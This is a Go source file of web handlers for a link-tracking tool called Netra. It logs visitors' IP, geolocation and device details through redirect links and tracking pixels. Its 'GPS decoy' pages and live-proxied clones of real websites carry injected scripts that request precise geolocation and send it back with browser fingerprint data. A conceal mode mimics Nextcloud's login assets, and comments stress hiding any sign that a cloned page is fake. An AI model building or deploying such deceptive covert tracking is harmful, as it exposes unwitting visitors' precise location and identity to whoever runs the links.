package handlers

import (
	"encoding/json"
	"errors"
	"fmt"
	"html/template"
	"io"
	"log"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/spignelon/netra/internal/db"
	"github.com/spignelon/netra/internal/geoip"
	"github.com/spignelon/netra/internal/mirror"
	"github.com/spignelon/netra/internal/models"
	"github.com/spignelon/netra/internal/uaparse"
	"github.com/spignelon/netra/web"
)

// transparent1x1PNG is a 1x1 fully transparent PNG used as the default pixel.
var transparent1x1PNG = []byte{
	0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00, 0x00, 0x0d,
	0x49, 0x48, 0x44, 0x52, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01,
	0x08, 0x06, 0x00, 0x00, 0x00, 0x1f, 0x15, 0xc4, 0x89, 0x00, 0x00, 0x00,
	0x0d, 0x49, 0x44, 0x41, 0x54, 0x78, 0x9c, 0x62, 0x00, 0x01, 0x00, 0x00,
	0x05, 0x00, 0x01, 0x0d, 0x0a, 0x2d, 0xb4, 0x00, 0x00, 0x00, 0x00, 0x49,
	0x45, 0x4e, 0x44, 0xae, 0x42, 0x60, 0x82,
}

// Favicon handles GET /favicon.ico, covering browsers/crawlers that request
// it directly regardless of the page's own <link rel="icon"> tag. In conceal
// mode it serves the real Nextcloud favicon (web.ConcealFavicon); otherwise
// the real Netra favicon (web/static/favicon.svg).
func (h *Handler) Favicon(w http.ResponseWriter, r *http.Request) {
	data := web.ConcealFavicon
	if !h.Concealed() {
		b, err := web.Static.ReadFile("static/favicon.svg")
		if err != nil {
			internalError(w, "favicon: read embedded asset", err)
			return
		}
		data = b
	}
	w.Header().Set("Content-Type", "image/svg+xml")
	w.Header().Set("Cache-Control", "public, max-age=3600")
	_, _ = w.Write(data)
}

// concealAsset writes one embedded conceal-mode asset (real Nextcloud logo,
// core favicon, or login background), or 404s when conceal mode is off,
// matching how every other conceal-only surface behaves.
func (h *Handler) concealAsset(w http.ResponseWriter, contentType string, data []byte) {
	if !h.Concealed() {
		http.NotFound(w, nil)
		return
	}
	w.Header().Set("Content-Type", contentType)
	w.Header().Set("Cache-Control", "public, max-age=3600")
	_, _ = w.Write(data)
}

// These three routes mirror Nextcloud's own real asset URLs — deliberately
// not served under /static/, and never named "conceal" in the URL itself,
// since that would spell out the disguise to anyone who views page source.

// ConcealLogo handles GET /core/img/logo/logo.svg.
func (h *Handler) ConcealLogo(w http.ResponseWriter, r *http.Request) {
	h.concealAsset(w, "image/svg+xml", web.ConcealLogo)
}

// ConcealCoreFavicon handles GET /core/img/favicon.svg — the in-page icon
// link the login page itself references (distinct from /favicon.ico above,
// which browsers/crawlers request directly regardless of page content).
func (h *Handler) ConcealCoreFavicon(w http.ResponseWriter, r *http.Request) {
	h.concealAsset(w, "image/svg+xml", web.ConcealFavicon)
}

// ConcealBackground handles GET /apps/theming/img/background/jo-myoung-hee-fluid.webp
// — Nextcloud's real default login-screen background image path.
func (h *Handler) ConcealBackground(w http.ResponseWriter, r *http.Request) {
	h.concealAsset(w, "image/webp", web.ConcealBackground)
}

// capture builds, enriches, and stores an event for a link, returning the new
// event id (useful for the GPS flow, which later attaches coordinates). It
// fires a best-effort hit notification if a webhook is configured for it.
func (h *Handler) capture(r *http.Request, link *models.Link, eventType string) int64 {
	ip := h.clientIP(r)
	var geo geoip.Result
	if h.GeoIPEnabled() {
		geo = h.Geo.Lookup(ip)
	}
	ua := uaparse.Parse(r.UserAgent())

	// Snapshot notable headers for later inspection.
	hdr := map[string]string{
		"X-Forwarded-For":    r.Header.Get("X-Forwarded-For"),
		"X-Real-IP":          r.Header.Get("X-Real-IP"),
		"DNT":                r.Header.Get("DNT"),
		"Sec-CH-UA":          r.Header.Get("Sec-CH-UA"),
		"Sec-CH-UA-Mobile":   r.Header.Get("Sec-CH-UA-Mobile"),
		"Sec-CH-UA-Platform": r.Header.Get("Sec-CH-UA-Platform"),
	}
	hdrJSON, _ := json.Marshal(hdr)

	e := &models.Event{
		LinkID:         link.ID,
		Type:           eventType,
		IP:             ip,
		Country:        geo.Country,
		Region:         geo.Region,
		City:           geo.City,
		Lat:            geo.Lat,
		Lon:            geo.Lon,
		ISP:            geo.ISP,
		Org:            geo.Org,
		ASN:            geo.ASN,
		UserAgent:      r.UserAgent(),
		Device:         ua.Device,
		OS:             ua.OS,
		Browser:        ua.Browser,
		Referer:        r.Referer(),
		AcceptLanguage: r.Header.Get("Accept-Language"),
		HeadersJSON:    string(hdrJSON),
	}
	id, err := h.DB.InsertEvent(e)
	if err != nil {
		log.Printf("capture: insert event: %v", err)
		return 0
	}

	loc := strings.TrimSuffix(strings.TrimSuffix(e.City+", "+e.Country, ", "), ",")
	if loc == "" {
		loc = "unknown location"
	}
	h.NotifyConfig().SendHit(
		fmt.Sprintf("Netra: %s on %s", eventTypeName(eventType), link.DisplayName()),
		fmt.Sprintf("%s from %s (%s) — %s / %s", eventTypeName(eventType), ip, loc, ua.Device, ua.Browser),
		link.Config.Channel,
	)
	return id
}

// eventTypeName renders an event type constant as a human-readable label
// for notification titles/messages.
func eventTypeName(t string) string {
	switch t {
	case models.EventClick:
		return "Click"
	case models.EventView:
		return "View"
	case models.EventPixelOpen:
		return "Pixel open"
	case models.EventGPS:
		return "GPS capture"
	}
	return t
}

// linkExpired reports whether a link has passed its time-based or
// click-count expiry, based on the current config and its event count.
func (h *Handler) linkExpired(link *models.Link) bool {
	if link.Config.ExpiresAt != "" {
		if t, err := time.Parse(time.RFC3339, link.Config.ExpiresAt); err == nil && time.Now().After(t) {
			return true
		}
	}
	if link.Config.MaxClicks > 0 {
		if n, err := h.DB.CountEvents(link.ID); err == nil && n >= link.Config.MaxClicks {
			return true
		}
	}
	return false
}

// notifyExpiredOnce fires a one-time "link expired" webhook and persists the
// ExpiredNotified flag so it never fires again for this link.
func (h *Handler) notifyExpiredOnce(link *models.Link) {
	if link.Config.ExpiredNotified {
		return
	}
	h.NotifyConfig().SendExpired(
		fmt.Sprintf("Netra: link expired — %s", link.DisplayName()),
		fmt.Sprintf("%s (%s) has reached its expiry (time limit or max clicks) and will no longer capture.",
			link.DisplayName(), link.Slug),
		link.Config.Channel,
	)
	link.Config.ExpiredNotified = true
	if err := h.DB.UpdateLinkConfig(link.ID, link.Config); err != nil {
		log.Printf("notify expired: update link config: %v", err)
	}
}

// lookupActive fetches a link by slug and 404s if missing, disabled, or expired.
func (h *Handler) lookupActive(w http.ResponseWriter, slug string) *models.Link {
	link, err := h.DB.GetLinkBySlug(slug)
	if errors.Is(err, db.ErrNotFound) || (link != nil && !link.Active) {
		http.NotFound(w, nil)
		return nil
	}
	if err != nil {
		internalError(w, "lookup link", err)
		return nil
	}
	if h.linkExpired(link) {
		h.notifyExpiredOnce(link)
		http.NotFound(w, nil)
		return nil
	}
	return link
}

// noStore sets headers to discourage caching of capture responses.
func noStore(w http.ResponseWriter) {
	w.Header().Set("Cache-Control", "no-store, no-cache, must-revalidate, private")
	w.Header().Set("Pragma", "no-cache")
	w.Header().Set("Expires", "0")
}

// Redirect handles GET /s/{slug}: logs a click then 302s to the destination.
func (h *Handler) Redirect(w http.ResponseWriter, r *http.Request) {
	link := h.lookupActive(w, r.PathValue("slug"))
	if link == nil {
		return
	}
	if link.Type != models.TypeRedirect {
		http.NotFound(w, nil)
		return
	}
	h.capture(r, link, models.EventClick)
	dest := link.Config.Destination
	if dest == "" {
		dest = "https://example.com"
	}
	noStore(w)
	http.Redirect(w, r, dest, http.StatusFound)
}

// Pixel handles GET /i/{slug}.png: logs an open then returns the image bytes.
func (h *Handler) Pixel(w http.ResponseWriter, r *http.Request) {
	slug := strings.TrimSuffix(r.PathValue("slug"), ".png")
	link := h.lookupActive(w, slug)
	if link == nil {
		return
	}
	if link.Type != models.TypePixel {
		http.NotFound(w, nil)
		return
	}
	h.capture(r, link, models.EventPixelOpen)
	noStore(w)

	// Serve a custom uploaded image if configured, else the transparent 1x1.
	if link.Config.ImagePath != "" {
		path := filepath.Join(h.Cfg.UploadsDir(), filepath.Base(link.Config.ImagePath))
		if f, err := os.Open(path); err == nil {
			defer f.Close()
			w.Header().Set("Content-Type", contentTypeFor(path))
			_, _ = io.Copy(w, f)
			return
		}
	}
	w.Header().Set("Content-Type", "image/png")
	_, _ = w.Write(transparent1x1PNG)
}

// GPSPage handles GET /g/{slug}: renders the decoy page which requests
// geolocation. If the link has an optional CloneURL configured, that real
// page is live-proxied instead of the built-in decoy theme (via the same
// service-worker bounce as Clone/Preview links — see GPSPageView), with the
// same geolocation-capture beacon injected into it.
func (h *Handler) GPSPage(w http.ResponseWriter, r *http.Request) {
	link := h.lookupActive(w, r.PathValue("slug"))
	if link == nil {
		return
	}
	if link.Type != models.TypeGPS {
		http.NotFound(w, nil)
		return
	}
	// Log the initial view; the browser JS will POST coordinates to attach.
	eventID := h.capture(r, link, models.EventView)
	noStore(w)

	if link.Config.CloneURL != "" {
		h.render(w, "mirror_loader.html", mirrorLoaderData("/g/"+link.Slug, eventID, originOf(link.Config.CloneURL), basePathOf(link.Config.CloneURL)))
		return
	}

	theme := link.Config.Theme
	if theme == "" {
		theme = "cats"
	}
	h.render(w, "decoy.html", map[string]any{
		"Slug":     link.Slug,
		"EventID":  eventID,
		"Theme":    theme,
		"Redirect": link.Config.Destination,
		"Label":    link.Label,
	})
}

// GPSPageView handles GET /g/{slug}/view: serves the actual live-proxied
// GPS-decoy clone page. See ClonePageView's doc comment — same split
// between the service-worker-backed unmodified relay (the normal case) and
// the ?direct=1 server-side-rewriting fallback.
func (h *Handler) GPSPageView(w http.ResponseWriter, r *http.Request) {
	link := h.lookupActive(w, r.PathValue("slug"))
	if link == nil || link.Type != models.TypeGPS || link.Config.CloneURL == "" {
		http.NotFound(w, nil)
		return
	}
	eventID := atoi64(r.URL.Query().Get("eid"))
	beacon := gpsBeaconScript(link.Slug, eventID, link.Config.Destination)
	noStore(w)

	var err error
	if r.URL.Query().Get("direct") == "1" {
		err = mirror.Serve(w, r, link.Config.CloneURL, "/g/"+link.Slug+"/r-legacy", beacon)
	} else {
		err = mirror.ServeRaw(w, r, link.Config.CloneURL, beacon)
	}
	if err != nil {
		// Same reasoning as ClonePageView's fallback: never show a visitor
		// anything that hints the live proxy failed. Fall back to the same
		// built-in decoy theme GPSPage renders when no CloneURL is set at
		// all, rather than a bare error response.
		log.Printf("gps clone view: mirror %q: %v", link.Config.CloneURL, err)
		theme := link.Config.Theme
		if theme == "" {
			theme = "cats"
		}
		h.render(w, "decoy.html", map[string]any{
			"Slug":     link.Slug,
			"EventID":  eventID,
			"Theme":    theme,
			"Redirect": link.Config.Destination,
			"Label":    link.Label,
		})
	}
}

// GPSServiceWorker handles GET /g/{slug}/sw.js: serves the shared mirror
// service worker script under this link's own scope (see
// ClonePageServiceWorker and web/static/mirror-sw.js).
func (h *Handler) GPSServiceWorker(w http.ResponseWriter, r *http.Request) {
	link := h.lookupActive(w, r.PathValue("slug"))
	if link == nil || link.Type != models.TypeGPS || link.Config.CloneURL == "" {
		http.NotFound(w, nil)
		return
	}
	h.serveMirrorSW(w)
}

// GPSResource handles /g/{slug}/r (any HTTP method): relays a single
// request the mirror service worker intercepted from the browser.
func (h *Handler) GPSResource(w http.ResponseWriter, r *http.Request) {
	link := h.lookupActive(w, r.PathValue("slug"))
	if link == nil || link.Type != models.TypeGPS || link.Config.CloneURL == "" {
		http.NotFound(w, nil)
		return
	}
	u := r.URL.Query().Get("u")
	if u == "" {
		http.NotFound(w, nil)
		return
	}
	if err := mirror.Relay(w, r, u); err != nil {
		http.NotFound(w, nil)
	}
}

// GPSResourceLegacy handles GET /g/{slug}/r-legacy: the sub-resource relay
// for the ?direct=1 fallback path (see GPSPageView) — the old
// CSS-url(...)-rewriting ServeResource, since without a service worker
// there's nothing else to resolve those references through this server.
func (h *Handler) GPSResourceLegacy(w http.ResponseWriter, r *http.Request) {
	link := h.lookupActive(w, r.PathValue("slug"))
	if link == nil || link.Type != models.TypeGPS || link.Config.CloneURL == "" {
		http.NotFound(w, nil)
		return
	}
	u := r.URL.Query().Get("u")
	if u == "" {
		http.NotFound(w, nil)
		return
	}
	if err := mirror.ServeResource(w, r, u, "/g/"+link.Slug+"/r-legacy"); err != nil {
		http.NotFound(w, nil)
	}
}

// gpsBeaconScript builds the inline script injected into a live-proxied GPS
// decoy clone page: it requests geolocation and posts the result back to
// this app's own /g/{slug}/loc endpoint, exactly like decoy.html's own
// script, then (if a post-capture redirect is configured) navigates there.
func gpsBeaconScript(slug string, eventID int64, redirect string) template.HTML {
	slugJS, _ := json.Marshal(slug)
	redirectJS, _ := json.Marshal(redirect)
	script := fmt.Sprintf(`<script>
(function(){
  var SLUG = %s, EVENT_ID = %d, REDIRECT = %s;
  function fingerprint() {
    return {
      tz: Intl.DateTimeFormat().resolvedOptions().timeZone || "",
      screen: screen.width + "x" + screen.height,
      lang: navigator.language || "",
      platform: navigator.platform || "",
    };
  }
  function send(lat, lon, accuracy) {
    fetch("/g/" + SLUG + "/loc", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ event_id: EVENT_ID, lat: lat || 0, lon: lon || 0, accuracy: accuracy || 0, fingerprint: fingerprint() }),
    }).finally(function () {
      if (REDIRECT) { setTimeout(function () { window.location.href = REDIRECT; }, 400); }
    });
  }
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      function (pos) { send(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy); },
      function () { send(null, null, null); },
      { enableHighAccuracy: true, timeout: 8000 }
    );
  } else {
    send(null, null, null);
  }
})();
</script>`, slugJS, eventID, redirectJS)
	return template.HTML(script)
}

// gpsPayload is the JSON body posted by the decoy page.
type gpsPayload struct {
	EventID     int64             `json:"event_id"`
	Lat         float64           `json:"lat"`
	Lon         float64           `json:"lon"`
	Accuracy    float64           `json:"accuracy"`
	Fingerprint map[string]string `json:"fingerprint"`
}

// GPSCollect handles POST /g/{slug}/loc: attaches precise coordinates to the event.
func (h *Handler) GPSCollect(w http.ResponseWriter, r *http.Request) {
	link := h.lookupActive(w, r.PathValue("slug"))
	if link == nil {
		return
	}
	if link.Type != models.TypeGPS {
		http.NotFound(w, nil)
		return
	}
	var p gpsPayload
	if err := json.NewDecoder(io.LimitReader(r.Body, 8<<10)).Decode(&p); err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}
	if p.EventID > 0 {
		// Scoped to this link's own id — without that, a forged event_id in
		// the POST body could overwrite GPS coordinates on an event
		// belonging to an entirely different link (see queries.go).
		if err := h.DB.AttachGPS(p.EventID, link.ID, p.Lat, p.Lon, p.Accuracy, p.Fingerprint); err != nil {
			log.Printf("gps attach: %v", err)
		}
	} else {
		// No prior event id (edge case): create a fresh GPS event.
		id := h.capture(r, link, models.EventGPS)
		if id > 0 {
			_ = h.DB.AttachGPS(id, link.ID, p.Lat, p.Lon, p.Accuracy, p.Fingerprint)
		}
	}
	// A real fix (permission granted) carries non-zero coordinates — the
	// decoy sends 0,0,0 when the visitor declines. Fire the dedicated
	// high-priority alert only for an actual capture.
	if p.Lat != 0 || p.Lon != 0 {
		h.NotifyConfig().SendGPSAlert(
			fmt.Sprintf("Netra: GPS captured — %s", link.DisplayName()),
			fmt.Sprintf("Precise location captured for %s: %f, %f (±%.0fm)", link.DisplayName(), p.Lat, p.Lon, p.Accuracy),
			link.Config.Channel,
		)
	}
	w.Header().Set("Content-Type", "application/json")
	_, _ = w.Write([]byte(`{"ok":true}`))
}

// ClonePage handles GET /p/{slug}: logs the view, then serves a small
// bounce page that registers the mirror service worker (mirror-sw.js) and
// waits for it to become active before redirecting to /p/{slug}/view — see
// ClonePageView and web/static/mirror-sw.js for why this two-step bounce
// exists (short version: it lets every subsequent resource fetch on the
// view page, including the very first one, be reliably intercepted).
func (h *Handler) ClonePage(w http.ResponseWriter, r *http.Request) {
	link := h.lookupActive(w, r.PathValue("slug"))
	if link == nil {
		return
	}
	if link.Type != models.TypeClone {
		http.NotFound(w, nil)
		return
	}
	eventID := h.capture(r, link, models.EventView)
	noStore(w)

	dest := link.Config.Destination
	if dest == "" {
		h.render(w, "clone.html", map[string]any{
			"Slug":        link.Slug,
			"Title":       orDefault(link.Config.Title, link.Label),
			"Description": link.Config.Description,
			"Image":       link.Config.Image,
			"Destination": "",
			"BaseURL":     h.Cfg.BaseURL,
			"Error":       "No destination configured for this link.",
		})
		return
	}

	h.render(w, "mirror_loader.html", mirrorLoaderData("/p/"+link.Slug, eventID, originOf(dest), basePathOf(dest)))
}

// ClonePageView handles GET /p/{slug}/view: serves the actual live-proxied
// page. With the mirror service worker active (the normal case, reached via
// the ClonePage bounce), it serves the target completely unmodified except
// for the fingerprint beacon injected before </body> — the service worker
// reroutes every resource fetch through ClonePageResource at the network
// layer instead of anything being rewritten here. That's what keeps a
// hydrated framework's client bundle (React, Next.js, etc.) seeing exactly
// the DOM attributes it expects, so hydration succeeds where the old
// server-side rewriter broke it.
//
// With ?direct=1 (set by the loader page when service workers aren't
// available — old browsers, or JS disabled falling through to the
// <noscript> link), it falls back to the older server-side HTML/CSS
// rewriter (mirror.Serve) so the page still basically works without a
// service worker, at the cost of that approach's hydration issues on
// heavily client-rendered sites.
func (h *Handler) ClonePageView(w http.ResponseWriter, r *http.Request) {
	link := h.lookupActive(w, r.PathValue("slug"))
	if link == nil {
		return
	}
	if link.Type != models.TypeClone {
		http.NotFound(w, nil)
		return
	}
	dest := link.Config.Destination
	if dest == "" {
		http.NotFound(w, nil)
		return
	}
	eventID := atoi64(r.URL.Query().Get("eid"))
	beacon := cloneFingerprintBeacon(link.Slug, eventID)
	noStore(w)

	var err error
	if r.URL.Query().Get("direct") == "1" {
		err = mirror.Serve(w, r, dest, "/p/"+link.Slug+"/r-legacy", beacon)
	} else {
		err = mirror.ServeRaw(w, r, dest, beacon)
	}
	if err != nil {
		// Diagnostic detail goes to the server log for the admin only — a
		// visitor hitting this link must never see anything suggesting a
		// proxy/mirror failed behind the scenes (that's a dead giveaway
		// this isn't the real site). Fall back to the same card shown when
		// no destination is configured at all: title/image/description and
		// a plain "Continue to site" link, nothing that hints at an error.
		log.Printf("clone view: mirror %q: %v", dest, err)
		h.render(w, "clone.html", map[string]any{
			"Slug":        link.Slug,
			"Title":       orDefault(link.Config.Title, link.Label),
			"Description": link.Config.Description,
			"Image":       link.Config.Image,
			"Destination": dest,
			"BaseURL":     h.Cfg.BaseURL,
		})
	}
}

// ClonePageServiceWorker handles GET /p/{slug}/sw.js: serves the shared
// mirror service worker script (web/static/mirror-sw.js) at a path under
// this link's own scope, so its default registration scope (/p/{slug}/)
// covers the view page without needing a Service-Worker-Allowed header.
func (h *Handler) ClonePageServiceWorker(w http.ResponseWriter, r *http.Request) {
	link := h.lookupActive(w, r.PathValue("slug"))
	if link == nil || link.Type != models.TypeClone {
		http.NotFound(w, nil)
		return
	}
	h.serveMirrorSW(w)
}

// serveMirrorSW writes the embedded mirror service worker script. Shared by
// Clone/Preview and GPS-decoy-clone links; its actual per-link behavior
// (target origin, relay path) is entirely parametrized via its own
// registration URL's query string, read client-side — see mirror-sw.js.
func (h *Handler) serveMirrorSW(w http.ResponseWriter) {
	b, err := web.Static.ReadFile("static/mirror-sw.js")
	if err != nil {
		internalError(w, "serve mirror sw", err)
		return
	}
	w.Header().Set("Content-Type", "application/javascript; charset=utf-8")
	w.Header().Set("Cache-Control", "no-cache")
	_, _ = w.Write(b)
}

// mirrorLoaderData builds the template data for the service-worker
// registration bounce page (mirror_loader.html) shared by Clone/Preview and
// GPS-decoy clone links. prefix is the link's own route prefix, e.g.
// "/p/abc123" or "/g/abc123".
func mirrorLoaderData(prefix string, eventID int64, targetOrigin, targetBasePath string) map[string]any {
	relay := prefix + "/r"
	swURL := prefix + "/sw.js?origin=" + url.QueryEscape(targetOrigin) +
		"&base=" + url.QueryEscape(targetBasePath) + "&relay=" + url.QueryEscape(relay)
	viewURL := fmt.Sprintf("%s/view?eid=%d", prefix, eventID)
	return map[string]any{
		"SWURL":     swURL,
		"Scope":     prefix + "/",
		"ViewURL":   viewURL,
		"DirectURL": viewURL + "&direct=1",
	}
}

// originOf returns "scheme://host" for rawURL, or "" if it doesn't parse —
// what the mirror service worker needs to reconstruct a same-origin
// relative fetch (e.g. fetch("/api/x")) the target page's own JS made,
// since from the browser's perspective that fetch resolves against this
// server's origin, not the target's.
func originOf(rawURL string) string {
	u, err := url.Parse(rawURL)
	if err != nil || u.Scheme == "" || u.Host == "" {
		return ""
	}
	return u.Scheme + "://" + u.Host
}

// basePathOf returns the directory portion of rawURL's path (no trailing
// slash, "" for root) — what the mirror service worker needs on top of
// originOf to correctly reconstruct a *page-relative* reference (e.g.
// src="./assets/x.js" or src="assets/x.js") from a target site that isn't
// hosted at its origin's root, such as a GitHub Pages project site
// (https://user.github.io/project/). The browser resolves that kind of
// reference against the *current document's own directory*, which on our
// proxied page is always this link's own prefix (e.g. "/p/abc123/"); the
// service worker strips that prefix back off and needs this target
// directory to put in its place, or it incorrectly reconstructs the real
// URL as if the target were hosted at its origin root (see the "beacon"
// GitHub Pages bug this was written to fix — assets 404'd because
// "/assets/x.js" was requested instead of "/project/assets/x.js"). A
// genuinely root-relative reference (href="/about") never gets this prefix
// applied by the browser in the first place, so it doesn't need this value.
func basePathOf(rawURL string) string {
	u, err := url.Parse(rawURL)
	if err != nil {
		return ""
	}
	dir := u.Path
	if i := strings.LastIndex(dir, "/"); i >= 0 {
		dir = dir[:i]
	} else {
		dir = ""
	}
	return dir
}

// ClonePageResource handles /p/{slug}/r (any HTTP method): relays a single
// request the mirror service worker intercepted from the browser — could be
// a script/image/font fetch, or an XHR/fetch call the page's own JS made.
func (h *Handler) ClonePageResource(w http.ResponseWriter, r *http.Request) {
	link := h.lookupActive(w, r.PathValue("slug"))
	if link == nil || link.Type != models.TypeClone {
		http.NotFound(w, nil)
		return
	}
	u := r.URL.Query().Get("u")
	if u == "" {
		http.NotFound(w, nil)
		return
	}
	if err := mirror.Relay(w, r, u); err != nil {
		http.NotFound(w, nil)
	}
}

// ClonePageResourceLegacy handles GET /p/{slug}/r-legacy: the sub-resource
// relay for the ?direct=1 fallback path (see ClonePageView) — kept as the
// old CSS-url(...)-rewriting ServeResource, since without a service worker
// there's nothing else to resolve those references through this server.
func (h *Handler) ClonePageResourceLegacy(w http.ResponseWriter, r *http.Request) {
	link := h.lookupActive(w, r.PathValue("slug"))
	if link == nil || link.Type != models.TypeClone {
		http.NotFound(w, nil)
		return
	}
	u := r.URL.Query().Get("u")
	if u == "" {
		http.NotFound(w, nil)
		return
	}
	if err := mirror.ServeResource(w, r, u, "/p/"+link.Slug+"/r-legacy"); err != nil {
		http.NotFound(w, nil)
	}
}

// fpPayload is the JSON body posted by the clone-page fingerprint beacon.
type fpPayload struct {
	EventID     int64             `json:"event_id"`
	Fingerprint map[string]string `json:"fingerprint"`
}

// ClonePageFingerprint handles POST /p/{slug}/fp: attaches JS-side
// fingerprint signals (timezone, screen size, language, platform) to the
// view event already logged for this visit — mirrors the GPS decoy's own
// fingerprint capture, kept low-risk (no new data category, same signals).
func (h *Handler) ClonePageFingerprint(w http.ResponseWriter, r *http.Request) {
	link := h.lookupActive(w, r.PathValue("slug"))
	if link == nil {
		return
	}
	if link.Type != models.TypeClone {
		http.NotFound(w, nil)
		return
	}
	var p fpPayload
	if err := json.NewDecoder(io.LimitReader(r.Body, 4<<10)).Decode(&p); err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}
	if p.EventID > 0 {
		// Scoped to this link's own id — see the identical note in
		// GPSCollect / queries.go's AttachFingerprint.
		if err := h.DB.AttachFingerprint(p.EventID, link.ID, p.Fingerprint); err != nil {
			log.Printf("clone fingerprint attach: %v", err)
		}
	}
	w.Header().Set("Content-Type", "application/json")
	_, _ = w.Write([]byte(`{"ok":true}`))
}

// cloneFingerprintBeacon builds the inline script injected into a
// live-proxied Clone/Preview page: it posts a handful of JS-side signals
// back to this app's own /p/{slug}/fp endpoint, for parity with the GPS
// decoy's fingerprinting. It does not affect navigation or rendering.
func cloneFingerprintBeacon(slug string, eventID int64) template.HTML {
	slugJS, _ := json.Marshal(slug)
	script := fmt.Sprintf(`<script>
(function(){
  var SLUG = %s, EVENT_ID = %d;
  fetch("/p/" + SLUG + "/fp", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      event_id: EVENT_ID,
      fingerprint: {
        tz: Intl.DateTimeFormat().resolvedOptions().timeZone || "",
        screen: screen.width + "x" + screen.height,
        lang: navigator.language || "",
        platform: navigator.platform || "",
      },
    }),
  });
})();
</script>`, slugJS, eventID)
	return template.HTML(script)
}

func contentTypeFor(path string) string {
	switch strings.ToLower(filepath.Ext(path)) {
	case ".jpg", ".jpeg":
		return "image/jpeg"
	case ".gif":
		return "image/gif"
	case ".webp":
		return "image/webp"
	default:
		return "image/png"
	}
}

func orDefault(s, def string) string {
	if strings.TrimSpace(s) == "" {
		return def
	}
	return s
}

// atoi64 parses a base-10 int64, returning 0 on error.
func atoi64(s string) int64 {
	n, err := strconv.ParseInt(s, 10, 64)
	if err != nil {
		return 0
	}
	return n
}
